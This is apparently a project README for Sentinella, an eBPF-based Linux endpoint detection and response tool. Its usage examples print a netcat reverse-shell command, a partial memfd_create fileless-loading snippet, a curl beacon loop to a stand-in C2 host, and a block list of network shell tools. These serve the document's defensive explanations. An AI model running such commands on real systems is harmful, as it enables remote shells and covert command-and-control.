<div align="center">

<img src="sentinellaico.png" alt="Sentinella Logo" width="128" height="128">

# 🛡️ Sentinella

**Real-Time Kernel-Level Threat Telemetry for Linux**

[![Rust](https://img.shields.io/badge/Rust-stable%20%2B%20nightly-orange?logo=rust)](https://www.rust-lang.org/)
[![eBPF](https://img.shields.io/badge/eBPF-Aya%200.13-blueviolet)](https://aya-rs.dev/)
[![Tauri](https://img.shields.io/badge/Tauri-v2-24C8D8?logo=tauri)](https://tauri.app/)
[![React](https://img.shields.io/badge/React-TypeScript-61DAFB?logo=react)](https://react.dev/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20x86__64-lightgrey?logo=linux)](https://kernel.org/)
[![Version](https://img.shields.io/badge/Version-v1.2.2-blue)](https://github.com/frenesyyyyy/SentinellaEDR)

<br/>

> **Zero-dependency, kernel-native endpoint detection and response.**
> Sentinella intercepts syscalls at the eBPF layer, maps behaviors to
> MITRE ATT&CK in real time, and enforces threat policy — all from a
> single lightweight desktop application.

</div>

---

## 📋 System Compatibility & Metadata

* **Current Version:** `v1.2.2`
* **Compatible OS:** Linux (specifically optimized for **Kali Linux**, **Debian**, and **Ubuntu**)
* **Kernel Requirements:** Linux Kernel `≥ 5.8` (required for modern BPF ring buffer support)
* **Architecture:** `x86_64` (AMD64)
* **Required Privileges:** Root / Superuser (needed to load and attach eBPF programs to kernel tracepoints)

---

## ✨ Features & Deep Technical Implementation

Sentinella provides deep kernel-level visibility and active threat containment with minimal host impact. Below is a detailed view of its core capabilities and how they are implemented:

### 1. eBPF Kernel Tracepoint Probes
Instead of traditional userland wrappers or heavy kernel modules, Sentinella hooks directly into the Linux kernel tracepoints using **Aya** (a pure Rust eBPF library).
* **Hooked Syscalls:** 
  * `sys_enter_execve` & `sys_enter_execveat` (Process executions)
  * `sys_enter_memfd_create` (Memory-only file creation)
  * `sys_enter_connect` (Outbound TCP/UDP connection attempts)
* **Implementation:** The eBPF bytecode runs inside the kernel context, capturing arguments, process identifiers (PIDs), and command-line vectors. Events are pushed to userspace via a high-performance **BPF Ring Buffer**, ensuring zero-copy delivery and avoiding kernel memory leaks.

### 2. Live MITRE ATT&CK Classification
Every event captured from the kernel is decoded and mapped against the **MITRE ATT&CK Matrix** in real time:
* **Tactic Mapping:** Matches syscall indicators to relevant tactics (e.g., Execution, Defense Evasion, Command and Control).
* **Technique Mapping:** Translates command structures into explicit techniques (e.g., `T1620` for Reflective Code Loading during fileless execution, `T1059` for Scripting Interpreters).

### 3. Fileless Execution Detection
Malware often writes payloads directly into RAM using memory file descriptors to bypass traditional disk-based antivirus scanners.
* **Implementation:** Sentinella monitors the `memfd_create` syscall. It checks the name of the memory segment and correlates it against a dynamically managed system-wide whitelist (e.g., PulseAudio, Wayland, Chrome, and Firefox subprocesses that legitimately use memfds). Any non-whitelisted or suspicious memfd creation is immediately flagged as a **Fileless Execution** threat.

### 4. C2 Beacon Detection (Behavioral Jitter Analysis)
Command and Control (C2) agents typically call back to their servers at regular intervals.
* **Implementation:** Sentinella tracks outbound network connection requests (`connect`) made by individual processes over a sliding temporal window. It performs a **jitter calculation** on the timing delta between successive connections. If the intervals deviate by less than 15% (showing automated, periodic timing), the process is flagged for beaconing behavior, indicating a suspected active implant or shell callback.

### 5. Learning & active Enforcement Engine
Sentinella operates in two modes, configurable on-the-fly:
* **Learning Mode (Audit Only):** Profiles the host system, capturing normal execution patterns and network channels without interfering with system operations.
* **Enforcement Mode:** Automatically terminates unauthorized activity. If a restricted tool (such as `nc`, `netcat`, `ncat`, or `socat`) is executed, or if a threat condition is met, the userspace engine intercepts the event and sends a kernel-level `SIGKILL` to the offending PID, shutting down the execution before damage occurs.

### 6. Event Flood Aggregation (Debounce Mechanism)
Modern software (e.g., web browsers, compiler tools) spawns hundreds of rapid short-lived threads. To keep the UI fluid and prevent notification exhaustion:
* **Implementation:** A 250ms debouncing window groups identical benign events (same executable path and command template). Staged events are collapsed and displayed in the UI with a multiplier badge (e.g., `Firefox ×42`).
* **Threat Safeguard:** Any event flagged as a threat or blocked tool **never** enters the aggregator. Threats bypass the debounce queue and render immediately on screen with 0ms latency.

---

## ⚡ Performance & Resource Efficiency

Sentinella is built for minimal footprint, making it ideal for resource-constrained systems or high-performance endpoints:
* **In-Kernel Filtering:** The eBPF programs filter benign kernel operations inside the kernel space. Only relevant event-driven syscalls are forwarded to userspace, reducing context-switching overhead.
* **CPU Utilization:** Under standard workstation workloads, the daemon consumes **less than 1% CPU**.
* **Zero Disk-Write Pipeline:** Telemetry events flow from the kernel memory straight to the Tauri userspace buffer and are rendered dynamically. No heavy log files are constantly written to disk, preserving storage health.
* **Zero-Copy Memory Architecture:** Communication between kernel-space and user-space utilizes zero-copy memory ring buffers, preventing CPU spikes even during process-spawning storms.

---

## 📖 Real-World Usage Cases

### Case 1: Blocking a Reverse Shell Attempt (Enforcement Mode)
An attacker attempts to spawn a reverse shell using netcat:
```bash
# Attacker triggers:
nc -e /bin/bash 192.168.1.100 4444
```
* **Sentinella Response:** The tracepoint program registers the `execve` of `/usr/bin/nc`. In Enforcement Mode, Sentinella identifies `nc` as a blacklisted restricted tool, halts execution immediately by issuing a `SIGKILL` to the process tree, and highlights the blocked event in red on the Live Dashboard.

### Case 2: Detecting a Memory-Only/Fileless Payload
A malicious script downloads an ELF binary and loads it directly into memory:
```bash
# Malware executes a script utilizing memfd_create
python3 -c "import ctypes; libc = ctypes.CDLL(None); fd = libc.memfd_create('payload', 1); ..."
```
* **Sentinella Response:** Intercepts the `memfd_create` syscall. It identifies the descriptor name `payload` as non-whitelisted. An alert is instantly triggered, displaying MITRE technique `T1620` (Reflective Code Loading) on the dashboard without blocking critical system components.

### Case 3: Flagging a C2 Callback (Beacon)
A background process periodically contacts an external host every 10 seconds to receive commands:
```bash
# Background process loops:
while true; do curl -s http://malicious-c2.com/ping; sleep 10; done
```
* **Sentinella Response:** Sentinella's sliding-window aggregator tracks the outgoing `connect` requests from the process. The jitter analysis detects a timing variance of $<2\%$, flags the process as a periodic Command and Control beacon (`T1071`), and alerts the system administrator.

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                      Linux Kernel                            │
│                                                              │
│  sys_enter_execve ──┐                                        │
│  sys_enter_memfd  ──┼──▶ eBPF Tracepoint Programs            │
│  sys_enter_connect ─┘         │                              │
│                               ▼                              │
│                        BPF Ring Buffer                       │
└────────────────────────────┬─────────────────────────────────┘
                             │  zero-copy
                             ▼
┌──────────────────────────────────────────────────────────────┐
│                   Rust Userspace (Aya)                        │
│                                                              │
│  ┌─────────────┐  ┌───────────────┐  ┌───────────────────┐   │
│  │ MITRE Engine│  │ Beacon Detect │  │ Event Aggregator  │   │
│  │ (Tactic Map)│  │ (Jitter Anal.)│  │ (250ms Debounce)  │   │
│  └──────┬──────┘  └───────┬───────┘  └────────┬──────────┘   │
│         └─────────────────┼───────────────────┘              │
│                           ▼                                  │
│               Tauri v2 IPC (Event Emitter)                   │
└───────────────────────────┬──────────────────────────────────┘
                             │  JSON events
                             ▼
┌──────────────────────────────────────────────────────────────┐
│              React + TypeScript Frontend                      │
│                                                              │
│  ┌──────────┐ ┌──────────┐ ┌────────────┐ ┌──────────────┐   │
│  │ Topbar   │ │ Stats Bar│ │ Telemetry  │ │ Threat       │   │
│  │ Controls │ │ Counters │ │ Grid Table │ │ Highlighting │   │
│  └──────────┘ └──────────┘ └────────────┘ └──────────────┘   │
└──────────────────────────────────────────────────────────────┘
```

---

## 📦 Project Structure

```
sentinella/
├── crates/
│   ├── sentinella-common/     # Shared #[repr(C)] event structs (no_std)
│   ├── sentinella-ebpf/       # eBPF tracepoint programs (BPF target)
│   └── sentinella-core/       # Userspace event processing & MITRE mapping
├── apps/
│   └── desktop/
│       ├── src/               # React + TypeScript UI
│       └── src-tauri/         # Tauri v2 Rust backend (sensor, aggregator)
├── xtask/                     # Build orchestration for eBPF compilation
├── install.sh                 # One-line installer script
└── Cargo.toml                 # Workspace root
```

---

## 🚀 Installation & Running via Git (Kali / Linux Shell)

Follow these steps to clone, build, and run Sentinella from source on your Linux machine:

### 1. Install Prerequisites & Build Tools
You need the nightly Rust toolchain, Clang, and Tauri development libraries:
```bash
# Update repositories and install required packages
sudo apt update && sudo apt install -y \
  clang llvm libelf-dev linux-headers-$(uname -r) \
  pkg-config build-essential zlib1g-dev libssl-dev \
  libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev \
  patchelf libgtk-3-dev libayatana-appindicator3-dev nodejs npm
```

### 2. Configure Rust Toolchain & Install BPF Linker
```bash
# Setup Rust stable and nightly
rustup install stable nightly
rustup component add rust-src --toolchain nightly

# Install the bpf-linker tool for eBPF code compilation
cargo install bpf-linker
```

### 3. Clone the Repository
```bash
git clone https://github.com/frenesyyyyy/SentinellaEDR.git
cd SentinellaEDR
```

### 4. Build and Compile eBPF Bytecode
Run the xtask manager to compile the eBPF kernel probes into the target location:
```bash
cargo xtask build-ebpf
```

### 5. Install Desktop Frontend Dependencies
```bash
cd apps/desktop
npm install
cd ../..
```

### 6. Run the Application
Start the desktop dashboard interface with system permissions (required to attach eBPF probes):
```bash
cd apps/desktop
sudo -E npm run tauri dev
```

---

## 🔧 One-Line Install Bootstrap (Kali/Debian)

To quickly install dependencies and run a pre-compiled version of the application:
```bash
curl -sSL https://raw.githubusercontent.com/frenesyyyyy/SentinellaEDR/main/install.sh | sudo bash
```

---

## 🖥️ User Interface Actions

| Action | Description |
|---|---|
| **Resume Sensor** | Attaches eBPF probes and begins real-time telemetry |
| **Pause Sensor** | Detaches probes, stops event collection |
| **LEARN / ENFORCE** | Toggle between baseline learning and active enforcement |
| **Clear Threats** | Clears the telemetry grid (does not affect the kernel sensor) |

---

## 🗺️ MITRE ATT&CK Coverage Map

| Tactic | Technique | Detection |
|---|---|---|
| Execution | T1059 — Command & Scripting Interpreter | execve tracing |
| Defense Evasion | T1620 — Reflective Code Loading | memfd_create monitoring |
| Command & Control | T1071 — Application Layer Protocol | connect() + beacon jitter |
| Persistence | T1053 — Scheduled Task/Job | execve context analysis |
| Discovery | T1082 — System Information Discovery | process execution patterns |

---

## ⚙️ Configuration Variables

| Environment Variable | Default | Description |
|---|---|---|
| `RUST_LOG` | `info` | Log verbosity (`trace`, `debug`, `info`, `warn`, `error`) |
| `CARGO_WORKSPACE_DIR` | auto-detect | Override workspace root for eBPF bytecode lookup |

---

## 📜 License

MIT — See [LICENSE](LICENSE) for details.

---

## 📋 Properties & Licensable Product

* **Product Name:** Sentinella
* **Logo / Icon:** [sentinellaico.png](sentinellaico.png)
* **Version:** `v1.2.2`
* **OS Compatibility:** Linux (Debian, Ubuntu, Kali Linux)
* **Publisher:** Frenesy
* **Copyright:** Copyright © 2026 Sentinella Contributors
* **License:** MIT
* **Scope:** Open-source EDR platform and telemetry sensor (Licensable product with full permission to run, modify, and distribute).

---

<div align="center">

**Built with ❤️ by Frenesy**

*Kernel-native endpoint security, no agents required.*

</div>
